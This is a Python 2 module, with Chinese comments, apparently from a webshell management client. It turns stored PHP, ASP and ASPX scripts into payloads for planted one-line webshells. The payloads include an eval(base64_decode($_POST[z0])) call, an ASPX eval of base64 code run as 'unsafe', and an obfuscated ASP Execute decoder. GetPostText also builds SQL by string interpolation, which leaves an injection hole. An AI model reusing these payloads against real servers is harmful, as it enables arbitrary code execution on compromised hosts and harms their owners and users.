#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#链接SHELL等操作
#from ui import * #UI变量
from Ui_View import ui #UI变量
from Clicked_Controller import log #日志记录
shell_sql = None
import re
import binascii
import urllib
import base64

def GetPostText(form,TYPE):
    try:
        global shell_sql
        #main_ui=ui.UIManager.get_ui('main_ui')
        shell_sql=ui.UIManager.shell_sql
        sql_data = "select data from %s where TYPE='%s'"%(str(form),str(TYPE))   # asc 表示升序 , desc表示降序
        cur = shell_sql.conn.cursor()# 用游标来查询就可以获取到结果
        cur.execute(sql_data)# 获取所有结果
        row = cur.fetchone()
        cur.close()  #关闭游标
        eval_data =""  #返回执行的代码
        data=base64.decodestring(str(row[0])) #encodestring编码    解码decodestring
        if form=="PHP":
            eval_data=php_Handle(data)  #PHP内容
        if form=="ASP":
            eval_data=asp_Handle(data)  #asp内容
        if form=="ASPX":
            eval_data=aspx_Handle(data)  #aspx内容
        return eval_data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
        return ""

#########################################################################
def aspx_Handle(aspx_data): #ASPX数据处理
    try:
        aspx_data=ASPX_replace(aspx_data)     #替换回车
        aspx_data=post_aspx_data(aspx_data)   #提交内容
        return aspx_data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def post_aspx_data(aspx_data):  #提交内容
    try:
        #ss_shell='''
        #=Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("{SCRIPT}")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
        #'''
        ss_shell="""=Response.Write("->|");"""\
                 """var err:Exception;"""\
                 """try{"""\
                 """eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("{SCRIPT}")),"unsafe");"""\
                 """}"""\
                 """catch(err)"""\
                 """{"""\
                 """Response.Write("ERROR:// "%2Berr.message);"""\
                 """}"""\
                 """Response.Write("|<-");"""\
                 """Response.End();"""
        aspx_data=base64.encodestring(str(aspx_data)) #encodestring编码    解码decodestring
        #aspx_data=aspx_data.replace("%0A","")  #替换掉换行符号
        shell2=ss_shell.replace("{SCRIPT}",urllib.quote(str(aspx_data)).replace("%0A",""))
        return shell2
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
def ASPX_replace(eval_string):
    eval_string=eval_string.replace("\r\n","")
    eval_string=eval_string.replace("\n","")
    return eval_string
#########################################################################
def post_php_data(php_data):  #提交内容
    try:
        data_base64=base64.b64encode(php_data)
        #data_base64=self.php_data     urllib.quote(
        data="=@eval(base64_decode($_POST[z0]));&z0=%s"%(urllib.quote(data_base64))  #quote URL编码
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
#过滤掉不需要内容
def php_Handle(PHP_data):   #PHP处理方法
    try:
        PHP_data=x0_zs(PHP_data)  #清除注释<?php   ?>
        PHP_data=x1_zs(PHP_data)  #清除注释/*   */
        PHP_data=x2_zs(PHP_data)  #清除//注释
        PHP_data=open_file_null(PHP_data)     #清除空行
        return PHP_data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def asp_Handle(ASP_data):  #asp处理方法
    try:
        #http://tool.chinaz.com/tools/urlencode.aspx
        #http://www.bejson.com/convert/ox2str/
        ASP_data=asp_x0_zs(ASP_data)  #清除<% %>
        ASP_data=asp_x2_zs(ASP_data)  #清除'注释
        ASP_data=open_file_null(ASP_data)     #清除空行
        ASP_data=str_re(ASP_data)  #字符替换
        if ASP_data[len(ASP_data)-1:]==":":   #3a  取消最后一行的\n  符号
            ASP_data=ASP_data[:len(ASP_data)-1]

        #ASP_data=str_char(ASP_data)  #对字符串处理
        #ASP_data=urllib.quote(ASP_data)  #quote URL编码
        ASP_data=asp_shell(binascii.b2a_hex(ASP_data.encode("utf8")))  #hex
        #ASP_data=urllib.quote(ASP_data)  #quote URL编码
        return ASP_data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
        return "ASP null except"

def str_re(eval_string): #将特殊字符 转换编码
    try:
        #eval_string=eval_string.replace(":","&chr(58)")
        eval_string=eval_string.replace("\t","chr(9)") #TAB
        eval_string=eval_string.replace("\"/\"","chr(47)") # "/"
        #eval_string=eval_string.replace("\"0\"","&chr(48)") #"0"
        eval_string=eval_string.replace("\n",":")
        # eval_string=eval_string.replace("&","%26")
        # eval_string=eval_string.replace("+","%2b")
        #eval_string=eval_string.replace(" ","+")
        return eval_string
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
        return "ASP null except"

def asp_shell(data):
    try:
        ss_shell="""=Eval("Execute(""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+""" \
                 """2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3A""" \
                 """Execute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3A""" \
                 """Execute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+""" \
                 """If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:""" \
                 """Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"{SCRIPT}\"\"\"\")):""" \
                 """Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End"")")"""
        #print ss_shell
        shell2=ss_shell.replace("{SCRIPT}",data)
        return shell2
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

#####################################################
#php代码处理
def open_file_null(file_data):  #清除空行
    try:
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        for every in sarr:
            if every.split():
                data+=every
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

# #取消注释
def file_index(data,file_data):  #查找字符串是否存在
    try:
        if file_data in data:
            return True
        else:
            return False
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def string_index(data,file_data):
    try:
        nPos = data.find(file_data) #查找字符        #print nPos
        #return data[0:nPos] #复制指定长度的字符
        return "%s\n"%(data[0:nPos])
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def x1_zs(file_data): #清除注释/*   */
    try:
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        zs=0  #注释标记
        for every in sarr:
            if file_index(every,"/*"):
                zs=1
            if file_index(every,"*/"):
                zs=0
                continue#终止本次
            if zs==0:
                data+=every
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def x2_zs(file_data): #清除//注释
    try:
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        for every in sarr:
            if file_index(every,"//"):
                every=string_index(every,"//") #截取字符串
            data+=every
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def x0_zs(file_data): #清除注释<?php   ?>
    try:
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        zs=0  #注释标记
        for every in sarr:
            if not (file_index(every,"<?php") or file_index(every,"?>")):
                data+=every
                #        if not file_index(every,"?>"):
                #            data+=every
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
#####################################################
def asp_x0_zs(file_data): #清除<% %>
    try:
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        #zs=0  #注释标记
        for every in sarr:
            if not (file_index(every,"<%") or file_index(every,"%>")):
                data+=every
                #        if not file_index(every,"?>"):
                #            data+=every
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def asp_x2_zs(file_data): #清除'注释
    try:
        data=""
        #其实在这个中间还是有个问题    如果内容为   '12312'123213'3232232323
        # 也会被认为有效代码应该在  清除前后空格  后判断第一个字符是否为'是的话就全取消掉
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        for every in sarr:
            #        if self.file_index(every,"'"):
            #            every=self.string_index(every,"'") #截取字符串
            #p1 = re.compile( r"'")
            #sarr2 = p1.findall(every)
            #print every
            #if not len(sarr2)%2==0 and len(sarr2)>=1:  #偶数或奇数
            #单数
            #every=every[0:int(every.rfind("'"))]

            try:
                every=every.strip()   #去除前后空格
                #print every.index("'")
                #print len(every)
                if len(every and "'"):
                    every=every[0:every.index("'")]
            except BaseException, e:
                pass
            #every=every   #清除前后空格.strip().lstrip()
            data+=every+"\n"
        return data
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))

def re_find(data1,data2):   #data1内容   data2查找内容      查找字符串
    try:
    # 你的代码
        matches = re.findall(r"%s"%(data2),data1)
        if len(matches):
            return 1
        else:
            return 0
    except BaseException, e:
        log.logging.debug("except:%s"%(str(e)))
        return 0
#########################################################################
if __name__=="__main__":
    print re_find("222111000","11")


